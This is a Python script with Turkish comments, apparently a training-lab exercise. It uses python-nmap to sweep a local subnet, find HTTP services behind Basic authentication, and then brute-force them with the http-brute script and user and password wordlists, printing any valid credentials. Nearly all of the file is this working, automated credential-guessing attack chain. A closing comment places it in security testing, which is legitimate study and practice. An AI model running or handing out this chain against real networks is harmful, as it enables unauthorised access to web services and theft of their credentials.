
import nmap
import re  # Düzenli ifadeler (regular expressions) modülünü içe aktarıyoruz.

# nmap modülünden bir PortScanner nesnesi oluşturuyoruz.
nm = nmap.PortScanner()
# Taranacak IP aralığını belirliyoruz. Burada 10.0.2.4/24 ağını tarayacağız.
ip_range = "10.0.2.4/24"  # Buraya terminale 'ip a' yazarak bulduğumuz ip adresi ve subnet maskesini yazdık.

# Belirtilen IP aralığında host taraması yapıyoruz.
nm.scan(ip_range, arguments='-sn')
#Belirtilen IP aralığında (10.0.2.4/24) host taraması yapılıyor. -sn argümanı sadece host keşfi yapar (ping taraması).

# Tarama sonucunda bulunan tüm hostları tek bir string haline getiriyoruz.
ip_list = ' '.join(nm.all_hosts())  # Hostları yanyana yazdırmak için join kullandık.

# Belirtilen  acık hostlarda servis ve versiyon taraması yapıyoruz.
nm.scan(ip_list, arguments='-sV')

http_ip_list = []  # HTTP servislerinin bulunduğu IP adreslerini saklamak için bir liste.
http_port_list = []  # HTTP servislerinin bulunduğu port numaralarını saklamak için bir liste.

# Bulunan tüm hostları kontrol ediyoruz.
for ip in nm.all_hosts():
    if "tcp" in nm[ip]:  # Hostun TCP portlarına bakıyoruz.
        #print(nm[ip]['tcp'].keys())
        #print("-----*")
        for port in nm[ip]['tcp'].keys():  # Her bir TCP portunu kontrol ediyoruz.
            if nm[ip]['tcp'][port]['name'] == "http":  # Eğer port HTTP servisini barındırıyorsa,
                name = nm[ip]['tcp'][port]['name']
                product = nm[ip]['tcp'][port]['product']
                version = nm[ip]['tcp'][port]['version']
                #print(ip, port, name, product, version)  # IP, port, servis adı, ürün ve versiyon bilgilerini yazdırıyoruz.
                if ip not in http_ip_list:  # HTTP servisini barındıran IP'yi listeye ekliyoruz.
                    http_ip_list.append(ip)
                if port not in http_port_list:  # HTTP servisini barındıran portu listeye ekliyoruz.
                    http_port_list.append(str(port))  # Port numarasını string olarak listeye ekliyoruz.

#print("###############")

# http-auth-finder scripti ile HTTP servislerinin kimlik doğrulama gerektirip gerektirmediğini kontrol ediyoruz.
nm.scan(' '.join(http_ip_list), ','.join(http_port_list), '--script http-auth-finder')
#print(nm.scaninfo())  # Tarama bilgilerini yazdırıyoruz.
#print(nm.all_hosts())  # Tüm hostları yazdırıyoruz.

targets=[] 
# Bulunan hostlarda kimlik doğrulama bilgilerini kontrol ediyoruz.
for host in nm.all_hosts():
    #print(nm[host]['tcp'].keys())  # Hostun tüm TCP portlarını yazdırıyoruz.
    for port in nm[host]['tcp'].keys():  # Her bir TCP portunu kontrol ediyoruz.
        if "script" in nm[host]['tcp'][port]:  # Eğer portta script sonucu varsa,
            #print(nm[host]['tcp'][port]['script']['http-auth-finder'])  # Kimlik doğrulama script sonuçlarını yazdırıyoruz.
            # HTTP Basic kimlik doğrulama yollarını belirlemek için düzenli ifade kullanıyoruz.
            paths = re.findall(host + ":" + str(port) + "(.*)HTTP: Basic", nm[host]['tcp'][port]['script']['http-auth-finder'])
            for path in paths:
                #print(path)  # Bulunan yolları yazdırıyoruz.
                new_target={"host":host,"port":str(port),"path":path.strip()}
                targets.append(new_target)
#print(targets)
# brute force yapacağız
# /usr/share/nmap/scripts/http-brute.nse

userdb="/home/kali/Desktop/BTK_Akademi/uygulamalar/nmap/user.lst"  # Kullanıcı adı listesinin yolu.
passdb="/home/kali/Desktop/BTK_Akademi/uygulamalar/nmap/pass.lst"  # Şifre listesinin yolu.

for target in targets:  # Her bir hedef için brute force saldırısı gerçekleştiriyoruz.
    host=target['host']  # Hedef IP adresini alıyoruz.
    port=target['port']  # Hedef port numarasını alıyoruz.
    path=target['path']  # Hedef yolu alıyoruz.
    nm.scan(host, port, '-sV --script http-brute --script-args path='+path+',userdb='+userdb+',passdb='+passdb)  # Brute force saldırısı gerçekleştiriyoruz.
    creds=re.findall("(.*)- Valid",nm[host]['tcp'][int(port)]['script']['http-brute'])  # Geçerli kimlik bilgilerini belirlemek için düzenli ifade kullanıyoruz.
    for cred in creds:
        print(host+":"+port+path,">>",cred.strip())  # Bulunan geçerli kimlik bilgilerini ekrana yazdırıyoruz.

#Bu kod, ağdaki cihazları ve HTTP servislerini bulur, bu servislerin kimlik doğrulama gerektirip gerektirmediğini kontrol eder ve 
#ardından brute force saldırıları ile bu kimlik doğrulama mekanizmalarını kırmaya çalışır. Bu tür tarama ve saldırılar, güvenlik testlerinde ve zafiyet analizlerinde kullanılır
